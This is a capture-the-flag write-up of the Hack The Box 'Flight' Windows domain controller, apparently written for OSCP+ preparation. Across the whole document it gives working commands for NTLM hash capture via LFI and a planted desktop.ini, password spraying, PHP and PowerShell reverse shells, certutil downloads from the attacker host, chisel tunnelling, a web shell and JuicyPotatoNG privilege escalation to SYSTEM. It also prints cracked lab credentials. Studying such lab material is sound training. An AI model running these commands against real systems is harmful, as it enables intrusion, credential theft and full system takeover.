---
layout: post
title:  HTB Flight Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-19 12:00:00 +0300
image:  '/images/htb_flight.png'
tags:   [Write-ups, HTB, OSCP+, Hard, Windows, Active-Directory, Vhost-Enumeration, Domain-User-Enumeration, AD-Password-Spraying, Password-Reuse, SMB-Share-Write-Permission-Abuse, .ini, Capturing-NTLMv2-Hashes-with-SMB-Server, PHP-Reverse-Shell, Chisel.exe, Port-Forwarding, RunasCs.exe, RunasCs.exe-Reverse-Shell, Microsoft-IIS, cmdasp.aspx, JuicyPotatoNG]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Vhost Enumeration to find school.flight.htb](#vhost-enumeration-to-find-schoolflighthtb)
  - [LFI on school.flight.htb to capture the NTLMv2 hash of svc_apache using a SMB server](#lfi-on-schoolflighthtb-to-capture-the-ntlmv2-hash-of-svc_apache-using-a-smb-server)
  - [Using svc_apache credentials to enumerate Domain Users](#using-svc_apache-credentials-to-enumerate-domain-users)
  - [Checking Domain Password Policy and Password Spraying with NetExec to check Password Reuse and find credentials of the user S.Moon](#checking-domain-password-policy-and-password-spraying-with-netexec-to-check-password-reuse-and-find-credentials-of-the-user-smoon)
  - [Using S.Moon to create and put a .ini file with a link to our SMB server on Kali to capture the hash of C.Bum](#using-smoon-to-create-and-put-a-ini-file-with-a-link-to-our-smb-server-on-kali-to-capture-the-hash-of-cbum)
- [Foothold](#foothold)
  - [Using C.Bum write permission on Web SMB share to upload a .php shell](#using-cbum-write-permission-on-web-smb-share-to-upload-a-php-shell)
  - [Using chisel.exe to forward port 8000 to our Kali](#using-chiselexe-to-forward-the-localhost-port-8000-to-our-kali)
  - [Using RunasCs.exe to get access as C.Bum](#using-runascsexe-to-get-access-as-cbum)
- [Privilege Escalation](#privilege-escalation)
  - [Uploading cmdasp.aspx into C:\inetpub](#uploading-cmdaspaspx-into-cinetpub)
  - [JuicyPotatoNG](#juicypotatong)

# Enumeration
### Nmap

```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.129.228.120

# Step 2 - Focus scan on the active ports found
nmap -A -T4 -Pn -p53,80,135,139,389,445,464,593,636,3268,3269,9389 10.129.228.120
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-19 03:43 EST
Nmap scan report for 10.129.228.120
Host is up (0.034s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-19T15:43:25
|_  start_date: N/A
|_clock-skew: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.32 seconds
```

Examining the results of our nmap scan, we can see the typical ports of a Domain Controller open.

Doing some AD uncredentialed enumeration and examining the website didnt give us any interesting findings.

### Vhost Enumeration to find school.flight.htb
Lets add flight.htb to /etc/hosts and do some vhost enumeration:

```shell
echo "10.129.228.120 flight.htb" | sudo tee -a /etc/hosts
```

Now we can use Gobuster to enumerate vhosts:

```shell
gobuster vhost -u http://flight.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -r
```

Examining the results, we can see that we got a valid result:

```shell
school.flight.htb
```

Lets add it to /etc/hosts:

```shell
echo "10.129.228.120 school.flight.htb" | sudo tee -a /etc/hosts
```

### LFI on school.flight.htb to capture the NTLMv2 hash of svc_apache using a SMB server

Lets examine the new vhost:

```shell
http://school.flight.htb/
```

If we click around, we will see that the URL of the website change like this:

```shell
http://school.flight.htb/index.php?view=home.html
http://school.flight.htb/index.php?view=about.html
http://school.flight.htb/index.php?view=blog.html
```

Examining the URL, we can see how the website interacts to get the pages, maybe we have a possible LFI vulnerability? Lets find it out!

Since its a Windows AD machine, I will create a SMB server on Kali and try to get a connection from the target machine to capture any NTLM hashes:

```shell
# Start SMB server on Kali
impacket-smbserver -smb2support kalishare .

# Enter the following URL on the web browser
http://school.flight.htb/index.php?view=//10.10.14.206/kalishare
```

Nice! We got a NTLMv2 hash in our running SMB server:

```shell
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:2f09827e4d999aed87f103013253fc75:010100000000000080a4c91b613adb01ca7aabb2b203d22e00000000010010004900500048006100460066006700560003001000490050004800610046006600670056000200100049004a004200570047007000540041000400100049004a004200570047007000540041000700080080a4c91b613adb0106000400020000000800300030000000000000000000000000300000f14ec98eb174c7fff2d0b0a2341a17003ddae9abef30be4f3dc7809f913d88bc0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200300036000000000000000000
[*] Closing down connection (10.129.228.120,49723)
```

Lets try to crack it:

```shell
# Put the hash into a text file and save it as svc_apache_hash.txt
echo 'svc_apache::flight:aaaaaaaaaaaaaaaa:2f09827e4d999aed87f103013253fc75:010100000000000080a4c91b613adb01ca7aabb2b203d22e00000000010010004900500048006100460066006700560003001000490050004800610046006600670056000200100049004a004200570047007000540041000400100049004a004200570047007000540041000700080080a4c91b613adb0106000400020000000800300030000000000000000000000000300000f14ec98eb174c7fff2d0b0a2341a17003ddae9abef30be4f3dc7809f913d88bc0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200300036000000000000000000' > svc_apache_hash.txt

# Use hashcat to crack it
hashcat -m 5600 svc_apache_hash.txt /usr/share/wordlists/rockyou.txt
```

We were able to crack the hash successfully and got the following credentials:

```shell
svc_apache:S@Ss!K@*t13
```

### Using svc_apache credentials to enumerate Domain Users
Now that we have the credentials of svc_apache, we can try to enumerate the users on the domain:

```shell
impacket-GetADUsers -all -dc-ip 10.129.228.120 flight.htb/svc_apache:'S@Ss!K@*t13' | awk 'NR>3 {print $1}' >> domain_users.txt
```

Remove the first 2 lines and we will get a clean list with only the domain users we found:

```shell
Administrator
Guest
krbtgt
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
```

### Checking Domain Password Policy and Password Spraying with NetExec to check Password Reuse and find credentials of the user S.Moon

Now that we got a list of valid domain user names, we can try checking if there is some password reuse and see if any user is using the same password as svc_apache.

Lets enumerate Domain Password Policy before we try any Password Spraying:

```shell
nxc smb 10.129.228.120 -u 'svc_apache' -p 'S@Ss!K@*t13' --pass-pol
```

```shell
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [+] Dumping password info for domain: flight
SMB         10.129.228.120  445    G0               Minimum password length: 7
SMB         10.129.228.120  445    G0               Password history length: 24
SMB         10.129.228.120  445    G0               Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.129.228.120  445    G0               
SMB         10.129.228.120  445    G0               Password Complexity Flags: 000001
SMB         10.129.228.120  445    G0                   Domain Refuse Password Change: 0
SMB         10.129.228.120  445    G0                   Domain Password Store Cleartext: 0
SMB         10.129.228.120  445    G0                   Domain Password Lockout Admins: 0
SMB         10.129.228.120  445    G0                   Domain Password No Clear Change: 0
SMB         10.129.228.120  445    G0                   Domain Password No Anon Change: 0
SMB         10.129.228.120  445    G0                   Domain Password Complex: 1
SMB         10.129.228.120  445    G0               
SMB         10.129.228.120  445    G0               Minimum password age: 1 day 4 minutes 
SMB         10.129.228.120  445    G0               Reset Account Lockout Counter: 30 minutes 
SMB         10.129.228.120  445    G0               Locked Account Duration: 30 minutes 
SMB         10.129.228.120  445    G0               Account Lockout Threshold: None
SMB         10.129.228.120  445    G0               Forced Log off Time: Not Set
```

Notice that the value of Account Lockout Threshold is None. This is the green light we need before starting a Password Spraying attack.

Lets use the password of svc_apache and check for credentials reuse:

```shell
nxc smb 10.129.228.120 -u domain_users.txt -p 'S@Ss!K@*t13' --continue-on-success
```

```shell
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [-] flight.htb\Name:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\--------------------:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         10.129.228.120  445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE
```

Nice! It seems like the user S.Moon is using the same password. This gave us the following new credentials:

```shell
S.Moon:S@Ss!K@*t13
```

### Using S.Moon to create and put a .ini file with a link to our SMB server on Kali to capture the hash of C.Bum

Lets see what we can do with the user S.Moon. I will start enumerating the permissions on SMB shares:

```shell
nxc smb 10.129.228.120 -u S.Moon -p 'S@Ss!K@*t13' --shares
```

```shell
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ
```

It seems like S.Moon has write permissions on the Shared SMB share.

This reminds me at some past CTF I did... maybe we can try putting a link somehow to capture the hash of another user who might click on that file.

To do this exploit and try capturing hashes, I will first start a SMB server on Kali again:

```shell
impacket-smbserver -smb2support kalishare .
```

The next thing I will do is create an .ini file containing a link to the SMB server on my Kali:

```shell
cat desktop.ini

[.ShellClassInfo]
IconResource=\\10.10.14.206\kalishare
```

Lets now access the Shared SMB share using S.Moon and put the file desktop.ini there:

```shell
impacket-smbclient flight.htb/S.Moon:'S@Ss!K@*t13'@10.129.228.120
```

```shell
# ls
[-] No share selected
# shares
ADMIN$
C$
IPC$
NETLOGON
Shared
SYSVOL
Users
Web
# use Shared
# ls
drw-rw-rw-          0  Tue Nov 19 11:30:52 2024 .
drw-rw-rw-          0  Tue Nov 19 11:30:52 2024 ..
# put desktop.ini
# ls
drw-rw-rw-          0  Tue Nov 19 11:38:55 2024 .
drw-rw-rw-          0  Tue Nov 19 11:38:55 2024 ..
-rw-rw-rw-         56  Tue Nov 19 11:38:55 2024 desktop.ini
```

It worked! We got some the hash of the user C.Bum:

```shell
[*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)
[*] User G0\c.bum authenticated successfully
[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:584588b60ab913233947aecb454a883c:0101000000000000806fcae0663adb017fdbccb5ee16d1d400000000010010004900500048006100460066006700560003001000490050004800610046006600670056000200100049004a004200570047007000540041000400100049004a0042005700470070005400410007000800806fcae0663adb0106000400020000000800300030000000000000000000000000300000f14ec98eb174c7fff2d0b0a2341a17003ddae9abef30be4f3dc7809f913d88bc0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200300036000000000000000000
[*] Closing down connection (10.129.228.120,56781)
[*] Remaining connections []
```

Lets try to crack the hash:

```shell
# Put the hash into a text file and save it as svc_apache_hash.txt
echo 'c.bum::flight.htb:aaaaaaaaaaaaaaaa:584588b60ab913233947aecb454a883c:0101000000000000806fcae0663adb017fdbccb5ee16d1d400000000010010004900500048006100460066006700560003001000490050004800610046006600670056000200100049004a004200570047007000540041000400100049004a0042005700470070005400410007000800806fcae0663adb0106000400020000000800300030000000000000000000000000300000f14ec98eb174c7fff2d0b0a2341a17003ddae9abef30be4f3dc7809f913d88bc0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200300036000000000000000000' > c_bum_hash.txt

# Use hashcat to crack it
hashcat -m 5600 c_bum_hash.txt /usr/share/wordlists/rockyou.txt
```

We managed to successfully crack the hash of the user c.bum, giving us the following credentials:

```shell
C.Bum:Tikkycoll_431012284
```

# Foothold

### Using C.Bum write permission on Web SMB share to upload a .php shell
Lets check what we can do with the user C.Bum. We can try checking SMB shares permission first:

```shell
nxc smb 10.129.228.120 -u C.Bum -p 'Tikkycoll_431012284' --shares
```

```shell
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\C.Bum:Tikkycoll_431012284 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ,WRITE
```

It seems like we have write permission on the Web share. My first idea when seeing this was to upload a .php shell there and see if we can trigger it. Lets try that!

I will use the PHP Ivan Sincek reverse shell and name it shell.php. You can get it from revshells.com.

Connect using impacket-smbclient and upload it:

```shell
impacket-smbclient flight.htb/C.Bum:'Tikkycoll_431012284'@10.129.228.120
```

```shell
Type help for list of commands
# use Web
# ls
drw-rw-rw-          0  Tue Nov 19 11:47:00 2024 .
drw-rw-rw-          0  Tue Nov 19 11:47:00 2024 ..
drw-rw-rw-          0  Tue Nov 19 11:47:00 2024 flight.htb
drw-rw-rw-          0  Tue Nov 19 11:47:00 2024 school.flight.htb
# cd flight.htb
# ls
drw-rw-rw-          0  Tue Nov 19 11:47:00 2024 .
drw-rw-rw-          0  Tue Nov 19 11:47:00 2024 ..
drw-rw-rw-          0  Tue Nov 19 11:47:00 2024 css
drw-rw-rw-          0  Tue Nov 19 11:47:00 2024 images
-rw-rw-rw-       7069  Thu Sep 22 16:17:00 2022 index.html
drw-rw-rw-          0  Tue Nov 19 11:47:00 2024 js
# put shell.php
# ls
drw-rw-rw-          0  Tue Nov 19 11:49:25 2024 .
drw-rw-rw-          0  Tue Nov 19 11:49:25 2024 ..
drw-rw-rw-          0  Tue Nov 19 11:47:00 2024 css
drw-rw-rw-          0  Tue Nov 19 11:47:00 2024 images
-rw-rw-rw-       7069  Thu Sep 22 16:17:00 2022 index.html
drw-rw-rw-          0  Tue Nov 19 11:47:00 2024 js
-rw-rw-rw-       9291  Tue Nov 19 11:49:25 2024 shell.php
```

Now start our nc listener on Kali:

```shell
nc -lvnp 8443
```

After that, use the following URL to access our shell.php and trigger it:

```shell
http://10.129.228.120/shell.php
```

Nice! We got a response on our nc listener:

```shell
listening on [any] 8443 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.228.120] 56823
SOCKET: Shell has connected! PID: 4692
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\flight.htb>whoami
flight\svc_apache
```

With the svc_apache account there is not much we can do, lets try to get access as another user.

### Using chisel.exe to forward port 8000 to our Kali
Enumerating the system we found the port 8000 running on the target, it didnt appear in our nmap scan.

Being the port 8000, I can try guessing its probably a website. Lets redirect it with chisel.exe:

```shell
# Move chisel.exe
# On Kali
python3 -m http.server 80

# On target CLI
certutil.exe -urlcache -split -f http://10.10.14.206/chisel.exe
```

Run chisel:

```shell
# On Kali
chisel server --reverse --port 51234

# On target CLI
powershell
.\chisel.exe client 10.10.14.206:51234 R:65432:127.0.0.1:8000
```

Lets now access it with our web browser:

```shell
http://127.0.0.1:65432
```

And there is the hidden website!

Lets get more information about it with whatweb:

```shell
whatweb http://127.0.0.1:65432
```

```shell
http://127.0.0.1:65432 [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[127.0.0.1], JQuery[1.10.2,1.11.2], Microsoft-IIS[10.0], Modernizr[2.8.3-respond-1.4.2.min], Script[text/javascript], Title[Flight - Travel and Tour], X-Powered-By[ASP.NET], X-UA-Compatible[IE=edge], YouTube
```

This is a Microsoft IIS website. The directories of these kind of websites are located at C:\inetpub. We cant access the C:\inetpub directory with svc_apache and S.Moon, but C.Bum would probably give us access.

### Using RunasCs.exe to get access as C.Bum
Lets create another shell.php to open another shell session using PHP Ivan Sincek reverse shell, our first shell is forwarding with chisel.exe:

```shell
# Copy the shell.php
cp shell.php shell2.php

# Edit port 8443 to 8080
sudo gedit shell2.php

# Upload into Web SMB share with impacket-smbclient

# Start nc listener
nc -lvnp 8080

# Access the following URL to trigger the reverse shell
http://10.129.228.120/shell2.php
```

After getting a second shell, we can try to get access as C.Bum.

First upload RunasCs.exe:

```shell
cd C:\Users\svc_apache\Desktop
certutil.exe -urlcache -split -f http://10.10.14.206/RunasCs.exe
```

After moving both files, start another nc listener:

```shell
nc -lvnp 9001
```

RunasCs.exe has a very nice parameter -r, which will grand us a reverse shell.

Using the following command, we will get a response on our nc listener:

```shell
powershell
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.206:9001 cmd
```

Nice! It worked, we got a shell as C.Bum:

```shell
listening on [any] 9001 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.228.120] 57127
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
flight\c.bum
```

### User Flag
Now we can get the user.txt flag:

```shell
type C:\Users\C.Bum\Desktop\user.txt
```

# Privilege Escalation
Use RunasCs.exe and nc listeners to create multiple shell sessions, just in case we need them:

```shell
# On Kali
nc -lvnp 9301
nc -lvnp 9302
nc -lvnp 9303
nc -lvnp 9304

# On target CLI
powershell
cd C:\Users\svc_apache\Desktop
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.206:9301 cmd
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.206:9302 cmd
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.206:9303 cmd
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.206:9304 cmd
```

### Uploading cmdasp.aspx into C:\inetpub
Now that we have a shell as C.Bum, we can upload a cmdasp.aspx shell and try interacting with it through the web browser thanks to the local port 8000 hidden website we forwarded before.

Doing some enumeration inside C:\inetpub we found out that we website is located at C:\inetpub\development.

Lets upload cmdasp.aspx to the following folder:

```shell
cd C:\inetpub\development
certutil.exe -urlcache -split -f http://10.10.14.206/cmdasp.aspx
```

Now we can access our interactive cmdasp.aspx shell visiting the following URL:

```shell
http://127.0.0.1:65432/cmdasp.aspx
```

We can run the following command there and see what we get:

```shell
whoami /all
```

```shell
User Name                  SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                          Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                           Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

It seems like this user has the infamous potato privilege SeImpersonatePrivilege enabled.

Lets get a true shell before we continue.

Go to revshells.com, get a PowerShell#3 (base64) reverse shell configured with kali tun0 IP and port 9005, start nc listener on Kali port 9005 and enter it on the cmdasp.aspx website interactive shell command input, then press execute.

We will get a response on our nc listener:

```shell
listening on [any] 9005 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.228.120] 56446
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv>
```

### JuicyPotatoNG
Now that we got a true shell, I will use JuicyPotatoNG to exploit and abuse this privilege.

Lets move le potato and nc.exe:

```shell
cd C:\Users\Public
certutil.exe -urlcache -split -f http://10.10.14.206/JuicyPotatoNG.exe
certutil.exe -urlcache -split -f http://10.10.14.206/nc.exe
```

After that, use icacls to grant permissions for everyone:

```shell
icacls nc.exe /grant Users:F
icacls JuicyPotatoNG.exe /grant Users:F
```

Start nc listener on Kali:

```shell
nc -lvnp 9201
```

Run JuicyPotatoNG.exe as follow:

```shell
C:\Users\Public\JuicyPotatoNG.exe -t * -p C:\Users\Public\nc.exe -a "10.10.14.206 9201 -e cmd.exe"
```

We got a response in our nc listening, giving us access as system:

```shell
listening on [any] 9201 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.228.120] 50121
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system
```

### Root Flag
Now we can get the root.txt flag:

```shell
type C:\Users\Administrator\Desktop\root.txt
```

